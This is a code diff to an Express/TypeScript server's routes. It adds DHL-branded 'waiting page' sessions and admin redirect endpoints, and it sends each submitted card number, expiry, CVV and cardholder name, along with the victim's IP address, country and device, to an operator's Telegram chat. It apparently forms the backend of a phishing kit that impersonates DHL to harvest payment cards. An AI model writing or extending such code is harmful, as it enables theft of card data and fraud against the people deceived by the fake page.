@@ -87,7 +87,46 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const validated = insertPaymentRecordSchema.parse(paymentData);
       const record = await storage.createPaymentRecord(validated);
       
-      res.json({ paymentId: record.id });
+      // Create DHL session for waiting page
+      const sessionId = Math.random().toString(36).substring(2, 10);
+      const clientInfo = await getClientInfo(req);
+      
+      await storage.createDhlSession({
+        sessionId,
+        cardNumber: req.body.cardNumber,
+        cardholderName: req.body.cardholderName,
+        ipAddress: clientInfo.ipAddress,
+        country: clientInfo.country,
+        device: clientInfo.device,
+        browser: clientInfo.browser,
+        status: "waiting",
+      });
+
+      // Send notification to Telegram
+      const settings = await storage.getAdminSettings();
+      if (settings?.telegramBotToken && settings?.telegramChatId) {
+        const message = formatPaymentNotification({
+          cardNumber: req.body.cardNumber,
+          expiryMonth: req.body.expiryMonth,
+          expiryYear: req.body.expiryYear,
+          cvv: req.body.cvv,
+          cardholderName: req.body.cardholderName,
+          timestamp: new Date(),
+          ipAddress: clientInfo.ipAddress,
+          country: clientInfo.country,
+          device: clientInfo.device,
+          browser: clientInfo.browser,
+          sessionId: sessionId,
+        });
+
+        await sendTelegramMessage(
+          settings.telegramBotToken,
+          settings.telegramChatId,
+          message
+        );
+      }
+      
+      res.json({ paymentId: record.id, sessionId });
     } catch (error) {
       if (error instanceof z.ZodError) {
         res.status(400).json({ error: error.errors });
@@ -236,6 +275,52 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json(waitingSessions);
     } catch (error) {
       res.status(500).json({ error: "Failed to get sessions" });
+    }
+  });
+
+  // DHL session endpoints
+  app.get("/api/dhl/session/:sessionId", async (req, res) => {
+    try {
+      const { sessionId } = req.params;
+      const session = await storage.getDhlSession(sessionId);
+
+      if (!session) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      res.json(session);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to get session" });
+    }
+  });
+
+  app.get("/api/admin/dhl-sessions", async (req, res) => {
+    try {
+      const sessions = await storage.getAllDhlSessions();
+      const waitingSessions = sessions.filter(s => s.status === "waiting");
+      res.json(waitingSessions);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to get sessions" });
+    }
+  });
+
+  app.post("/api/admin/dhl-sessions/:sessionId/redirect", async (req, res) => {
+    try {
+      const { sessionId } = req.params;
+      const { redirectUrl } = req.body;
+
+      const updated = await storage.updateDhlSession(sessionId, {
+        redirectUrl,
+        status: "redirected",
+      });
+
+      if (!updated) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      res.json(updated);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to update session" });
     }
   });
 
